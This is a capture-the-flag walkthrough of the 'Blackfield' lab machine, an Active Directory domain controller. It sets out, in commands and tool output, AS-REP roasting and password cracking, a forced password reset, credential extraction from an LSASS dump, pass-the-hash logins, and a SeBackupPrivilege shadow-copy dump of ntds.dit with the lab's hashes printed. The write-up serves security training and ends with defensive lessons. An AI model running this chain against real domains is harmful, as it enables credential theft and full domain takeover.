---
title: "Blackfield"
slug: "blackfield"
toc:
  - id: "reconnaissance"
    label: "Reconnaissance"
  - id: "smb-enumeration"
    label: "SMB Enumeration"
  - id: "as-rep-roasting"
    label: "AS-REP Roasting"
  - id: "domain-enumeration"
    label: "Domain Enumeration"
  - id: "resetting-audit2020"
    label: "Resetting audit2020"
  - id: "dumping-lsass"
    label: "Dumping LSASS"
  - id: "user-flag"
    label: "User Flag"
  - id: "privilege-escalation"
    label: "Privilege Escalation"
  - id: "root-flag"
    label: "Root Flag"
  - id: "key-takeaways"
    label: "Key Takeaways"
---

## Reconnaissance

I started with a full port scan and service detection.

```
$ nmap -p- --min-rate=3000 --max-retries=3 -T4 -sCV -Pn -n 10.129.229.17
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 07:08 +0200
Nmap scan report for 10.129.229.17
Host is up (0.025s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-12 05:09:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-12T05:09:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.06 seconds
```

> **Note:** This is clearly a domain controller — Kerberos (88), LDAP (389/3268) and DNS (53) under `BLACKFIELD.local`.

I added the domain and host to `/etc/hosts`.

```
$ echo '10.129.229.17    blackfield.local dc01.blackfield.local' | sudo tee -a /etc/hosts
10.129.229.17    blackfield.local dc01.blackfield.local
```

## SMB Enumeration

With no credentials, I checked whether the guest account could list shares.

```
$ nxc smb dc01.blackfield.local -u guest -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest:
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

The guest account could read `profiles$`. Listing it returned a directory per user.

```
$ smbclient -U 'guest%' //blackfield.local/profiles$
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 18:47:12 2020
  ..                                  D        0  Wed Jun  3 18:47:12 2020
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020
  AChampken                           D        0  Wed Jun  3 18:47:11 2020
  ACheretei                           D        0  Wed Jun  3 18:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020
  AHigchens                           D        0  Wed Jun  3 18:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020
  <SNIP>
```

I extracted the usernames from the share listing and saved them to a file.

```
$ smbclient -U 'guest%' //blackfield.local/profiles$ -c 'ls' | awk -F ' ' '{print $1}' > users.txt
```

## AS-REP Roasting

I ran the username list through GetNPUsers to AS-REP roast any pre-auth-disabled account.

```
$ impacket-GetNPUsers blackfield.local/guest@dc01.blackfiled.local -no-pass -usersfile users.txt | grep -v '[-]'

$krb5asrep$23$support@BLACKFIELD.LOCAL:fba222759f367708d63393c980359afc$6293395d7c9ad0d5ddf6e184c15ed63034ff68024ca9e7d4606c44b2f7fa8b69a92734fbdd97a751236897c1da6812c316dfdd22eccbd4bc91a2fc2bd3623c3553bd9dcddf273790c84364e3b46629a939a2e2cb2394e620583c617860004020365117289867554fa0a445f2820e39a53e475ba46d8702b511903320ed9783176f77266d3e1e4f9d9b3b6c29f8347c8512438459d7bbd21e9d9115ed8c3385920c4a66f4350d4f14b82e1ab4aedccb7b0b7e3f311b88f53cc4cb2658921ef0722c40a482fb4abb3164b016c6080662bdc1c0faf368fb6843ed5531a79fbb83cbc522b497a106babcb4bb6929f7576946269fb7dc
```

The `support` account came back AS-REP-roastable. I re-ran the same query and redirected it to a file for cracking.

```
$ impacket-GetNPUsers blackfield.local/guest@dc01.blackfiled.local -no-pass -usersfile users.txt | grep -v '[-]' > asreproast.txt
```

I ran the AS-REP hash through John and it cracked almost immediately.

```
$ john asreproast.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:08 DONE (2026-10-12 04:28) 0.1137g/s 1630Kp/s 1630Kc/s 1630KC/s #1pitcher..."chito"
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> **Note:** I now have valid domain credentials as `support:#00^BlackKnight`. The account can't log in remotely, but now I can enumerate the domain properly.

## Domain Enumeration

I ran the BloodHound ingestor as `support` to map the domain's attack paths.

```
$ bloodhound-ce-python -d blackfield.local -u support -p '#00^BlackKnight' -ns 10.129.229.17 --zip -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 24S
INFO: Compressing output into 20261012043021_bloodhound.zip
```

BloodHound showed `support` with a `ForceChangePassword` edge straight to `audit2020` — I can reset that account's password without knowing the current one.

[![BloodHound graph showing SUPPORT with a ForceChangePassword edge to AUDIT2020](/images/walkthroughs/blackfield/bloodhound-support-audit2020.png)](/images/walkthroughs/blackfield/bloodhound-support-audit2020.png)

## Resetting audit2020

I reset `audit2020`'s password over LDAP with bloodyAD.

```
$ bloodyad -u support -p '#00^BlackKnight' -d blackfield.local --host dc01.blackfield.local set password audit2020 'Password123!'
[+] Password changed successfully!
```

A quick SMB check validated the reset credentials.

```
$ crackmapexec smb blackfield.local -u audit2020 -p 'Password123!'
SMB         BLACKFIELD.local 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         BLACKFIELD.local 445    DC01             [+] BLACKFIELD.local\audit2020:Password123!
```

With `audit2020`, the `forensic` share was now readable.

```
$ nxc smb blackfield.local -u audit2020 -p 'Password123!' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Password123!
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

## Dumping LSASS

I ran a recursive `ls` on `forensic`, which came back fairly large.

```
$ smbclient -U "audit2020%Password123!" //dc01.blackfield.local/forensic
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

        5102079 blocks of size 4096. 1687425 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

\commands_output
  .                                   D        0  Sun Feb 23 19:14:37 2020
  ..                                  D        0  Sun Feb 23 19:14:37 2020
  domain_admins.txt                   A      528  Sun Feb 23 14:00:19 2020
  domain_groups.txt                   A      962  Sun Feb 23 13:51:52 2020
  domain_users.txt                    A    16454  Fri Feb 28 23:32:17 2020
  firewall_rules.txt                  A   518202  Sun Feb 23 13:53:58 2020
  ipconfig.txt                        A     1782  Sun Feb 23 13:50:28 2020
  netstat.txt                         A     3842  Sun Feb 23 13:51:01 2020
  route.txt                           A     3976  Sun Feb 23 13:53:01 2020
  systeminfo.txt                      A     4550  Sun Feb 23 13:56:59 2020
  tasklist.txt                        A     9990  Sun Feb 23 13:54:29 2020
  <SNIP>
```

So I mounted the share locally to browse it more efficiently.

```
$ mkdir forensic && sudo mount -t cifs //blackfield.local/forensic ./forensic -o 'username=audit2020,password=Password123!'
```

Inside `memory_analysis` were zipped process dumps, and `lsass.zip` stood out.

```
$ tree forensic/
<SNIP>
├── memory_analysis
│   ├── conhost.zip
│   ├── ctfmon.zip
│   ├── dfsrs.zip
│   ├── dllhost.zip
│   ├── ismserv.zip
│   ├── lsass.zip
│   ├── mmc.zip
│   ├── RuntimeBroker.zip
│   ├── ServerManager.zip
│   ├── sihost.zip
│   ├── smartscreen.zip
│   ├── svchost.zip
│   ├── taskhostw.zip
│   ├── winlogon.zip
│   ├── wlms.zip
│   └── WmiPrvSE.zip
<SNIP>
```

I copied `lsass.zip` out and unzipped the LSASS dump.

```
$ cp forensic/memory_analysis/lsass.zip . && unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP
```

I ran pypykatz over the dump and pulled credentials out of the logon sessions.

```
$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
    == MSV ==
        Username: svc_backup
        Domain: BLACKFIELD
        LM: NA
        NT: 9658d1d1dcd9250115e2205d9f48400d
        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
    == WDIGEST [633ba]==
        username svc_backup
        domainname BLACKFIELD
        password None
        password (hex)
    == Kerberos ==
        Username: svc_backup
        Domain: BLACKFIELD.LOCAL
        AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
        AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
    == WDIGEST [633ba]==
        username svc_backup
        domainname BLACKFIELD
        password None
        password (hex)
<SNIP>
```

> **Note:** The LSASS dump holds plenty of `DC01$` sessions and even an `Administrator` MSV entry, but that one's stale — `svc_backup`'s NT hash `9658d1d1dcd9250115e2205d9f48400d` is the usable credential here.

## User Flag

`svc_backup` is a Remote Management user, so the hash gave me WinRM access.

```
$ nxc winrm blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
WINRM       10.129.229.17   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.129.229.17   5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

I logged in with Evil-WinRM and grabbed the user flag.

```
$ evil-winrm -i blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

<SNIP>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ../desktop/user.txt
3920************************b543
```

## Privilege Escalation

I checked my token privileges and, as I expected, `svc_backup` held `SeBackupPrivilege` and `SeRestorePrivilege`.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

> **Note:** `SeBackupPrivilege` lets me read any file on the system regardless of ACLs — including `ntds.dit`. The file is locked while the DC is running, so I use a shadow copy to get a stable copy of the volume.

I prepared a diskshadow script to create a shadow copy of `C:`. Then I converted it to DOS format.

```
$ cat > shadowCopy << EOF
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
EOF
$ unix2dos shadowCopy
unix2dos: converting file shadowCopy to DOS format...
```

I uploaded the script and executed it with diskshadow to create the snapshot.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload shadowCopy

Info: Uploading /home/pwndalf/Documents/HTB/Machines/Blackfield/shadowCopy to C:\Users\svc_backup\Documents\shadowCopy

Data: 252 bytes of 252 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents> diskshadow /s shadowCopy
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/11/2026 8:50:37 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,
because it requires volume  which is not in the shadow copy set.
The writer "ASR Writer" is now entirely excluded from the backup because the top-level
non selectable component "\BCD\BCD" is excluded.

* Including writer "Task Scheduler Writer":
    + Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
    + Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
    + Adding component: \PerformanceCounters

* Including writer "System Writer":
    + Adding component: \System Files
    + Adding component: \Win32 Services Files

* Including writer "WMI Writer":
    + Adding component: \WMI

* Including writer "NTDS":
    + Adding component: \C:_Windows_NTDS\ntds

* Including writer "Registry Writer":
    + Adding component: \Registry

* Including writer "COM+ REGDB Writer":
    + Adding component: \COM+ REGDB

* Including writer "DFS Replication service writer":
    + Adding component: \SYSVOL\B0E5E5E5-367C-47BD-8D81-52FF1C8853A7-A711151C-FA0B-40DD-8BDB-780EF9825004

Alias cdrive for shadow ID {550dcf1a-a55c-4df9-96ac-596cbbd18dc4} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {edde8281-2db5-4a52-a98a-41092142b234} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file Dis6696.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {edde8281-2db5-4a52-a98a-41092142b234}

    * Shadow copy ID = {550dcf1a-a55c-4df9-96ac-596cbbd18dc4}        %cdrive%
        - Shadow copy set: {edde8281-2db5-4a52-a98a-41092142b234}    %VSS_SHADOW_SET%
        - Original count of shadow copies = 1
        - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
        - Creation time: 10/11/2026 8:50:50 PM
        - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4
        - Originating machine: DC01.BLACKFIELD.local
        - Service machine: DC01.BLACKFIELD.local
        - Not exposed
        - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
        - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {550dcf1a-a55c-4df9-96ac-596cbbd18dc4}
The shadow copy was successfully exposed as E:\.
-> end backup
->
```

With the snapshot exposed as `E:`, I used robocopy in backup mode to copy `ntds.dit`.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /np /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Sunday, October 11, 2026 9:14:39 PM
   Source : E:\Windows\ntds\
     Dest : C:\Users\svc_backup\Documents\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /NP /R:1000000 /W:30

------------------------------------------------------------------------------

                       1    E:\Windows\ntds\
        New File            18.0 m    ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           1179648000 Bytes/sec.
   Speed :            67500.000 MegaBytes/min.
   Ended : Sunday, October 11, 2026 9:14:39 PM
```

I also needed the `system` hive for the boot key that decrypts the database.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save hklm\system system
The operation completed successfully.
```

I downloaded both files to my box.

```
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download system

Info: Downloading C:\Users\svc_backup\Documents\system to system

Info: Download successful!
*Evil-WinRM* PS C:\Users\svc_backup\Documents> download ntds.dit

Info: Downloading C:\Users\svc_backup\Documents\ntds.dit to ntds.dit

Info: Download successful!
```

I ran secretsdump against `ntds.dit` and the `system` hive to dump the domain hashes.

```
$ impacket-secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:9898052bdaa6da25a4befef710600695:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
<SNIP>
```

## Root Flag

I logged in over WinRM using the Administrator hash and read the root flag.

```
$ evil-winrm -i blackfield.local -u administrator -H 184fb5e5178480be64824d4cd53b99ee

<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
4375************************55cb
```

## Key Takeaways

**Guest-readable shares leak the user list.** — The `profiles$` share was readable by the guest account and contained a directory per employee, which I turned straight into a username wordlist. Anonymous and guest access to SMB should be disabled, and shares should never expose organisational structure to unauthenticated users.

**AS-REP roasting needs only a username.** — Because `support` had pre-authentication disabled, anyone with its name could pull an offline-crackable hash, and a weak password did the rest. Disable "Do not require Kerberos preauthentication" except where an application truly needs it, and enforce long, random passwords on those accounts.

**Password-reset rights are a privilege.** — A single `ForceChangePassword` edge let `support` take over `audit2020` and reach a share full of forensic memory dumps. Delegated reset rights should be tightly scoped and reviewed in BloodHound, because they chain into much larger compromises.

**Don't leave LSASS dumps lying around.** — The "forensic" share stored a raw `lsass.DMP` that handed me a service account's NT hash. Memory captures contain live credentials and must be encrypted, access-controlled, and deleted once the investigation is done.

**SeBackupPrivilege is domain admin on a DC.** — With backup rights, `svc_backup` could snapshot the volume with diskshadow and copy `ntds.dit` out, exposing every hash in the domain. Membership of Backup Operators and any account holding `SeBackupPrivilege` on a DC should be treated as Tier-0 and kept to an absolute minimum.
